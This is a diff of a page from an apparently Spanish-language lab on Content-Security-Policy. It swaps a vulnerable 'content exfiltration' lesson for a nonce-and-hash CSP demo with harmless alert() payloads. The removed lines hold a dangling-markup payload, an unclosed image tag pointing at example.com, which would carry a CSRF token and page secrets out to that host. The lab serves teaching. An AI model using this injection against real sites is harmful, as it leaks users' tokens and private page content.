@@ -21,18 +21,20 @@
   <link rel="stylesheet" href="../node_modules/@highlightjs/cdn-assets/styles/dark.min.css">
 
   
-  <meta id="csp" http-equiv="Content-Security-Policy" content="script-src &#39;nonce-8IBTHwOdqNKAWeKl7plt8g==&#39; &#39;sha256-opnq3UrQLt34nD/Io3x4OQXex7rVCcRNO2/Dym9R8ro=&#39;;base-uri &#39;none&#39;;">
+  <meta id="csp" http-equiv="Content-Security-Policy" content="script-src &#39;nonce-8IBTHwOdqNKAWeKl7plt8g==&#39; &#39;sha256-opnq3UrQLt34nD/Io3x4OQXex7rVCcRNO2/Dym9R8ro=&#39;;">
   
 
   <script src="js/darkmode.js" nonce="8IBTHwOdqNKAWeKl7plt8g=="  defer></script>
   <title>
     
-18 - Exfiltración de contenido
+11 - CSP usando un nonce y hash
 
   </title>
 
   
-<script src="js/csp.js" nonce="8IBTHwOdqNKAWeKl7plt8g==" defer></script>
+<meta id="csp" http-equiv="Content-Security-Policy" content="script-src &#39;nonce-8IBTHwOdqNKAWeKl7plt8g==&#39; &#39;sha256-opnq3UrQLt34nD/Io3x4OQXex7rVCcRNO2/Dym9R8ro=&#39;;">
+<script src="js/csp.js" nonce="8IBTHwOdqNKAWeKl7plt8g=="  defer></script>
+<script src="js/showpayload.js" nonce="8IBTHwOdqNKAWeKl7plt8g=="  defer></script>
 
 </head>
 
@@ -45,7 +47,7 @@
         <ul>
           <h1>
             
-18 - Exfiltración de contenido
+11 - CSP usando un nonce y hash
 
           </h1>
         </ul>
@@ -56,7 +58,7 @@
       </nav>
       
 
-<p class="pico-background-red-500">Ejemplo vulnerable</p>
+<p class="pico-background-jade-500">Ejemplo no vulnerable</p>
 
 
     </header>
@@ -69,20 +71,53 @@
     </fieldset>
 
     
-<img src='https://example.com/?<p>Secretos</p>
-<form>
-  <input type="hidden" name="csrf" value="abc123">
-  <input type="submit" value="Enviar">
-</form>
-<script nonce="8IBTHwOdqNKAWeKl7plt8g=="></script>
-<p class='red'>Más secretos</p>
+<section>
+  <h2>
+    <i class="fa-solid fa-shield-halved"></i>
+    Content-Security-Policy
+  </h2>
+  <pre><code id="csp-content" class="language-http"></code></pre>
+</section>
+
+<section>
+  <h2>
+    <i class="fa-solid fa-code"></i>
+    Payload
+  </h2>
+  <pre><code id="payload-content" class="language-html"></code></pre>
+  <button id="inject">Inject</button>
+  <a href="hash-and-nonce.html" role="button" class="secondary outline">Restart</a>
+</section>
+
+<section>
+  <h2>
+    <i class="fa-solid fa-syringe"></i>
+    Injected content
+  </h2>
+  <div id="injection"></div>
+</section>
+
+<section>
+  <h2>
+    <i class="fa-solid fa-circle-exclamation"></i>
+    Errors
+  </h2>
+  <pre><code id="errors"></code></pre>
+</section>
+
+<template id="payload-template"><script nonce="8IBTHwOdqNKAWeKl7plt8g==">
+  alert("Este script si está permitido")
+</script>
+
+<script>alert("Inline script correspondiente al hash!")</script></template>
+
 
 
     
   <nav>
     <ul>
       <li>
-        <a href="17.html" role="button" class="secondary outline" >
+        <a href="angularjs-is-back.html" role="button" class="secondary outline" >
           <i class="fa-solid fa-chevron-left"></i>
           anterior
         </a>
@@ -95,7 +130,7 @@
     </ul>
     <ul>
       <li>
-        <a href="19.html" role="button" class="secondary outline" >
+        <a href="hash-and-nonce-in-action.html" role="button" class="secondary outline" >
           siguiente
           <i class="fa-solid fa-chevron-right"></i>
         </a>
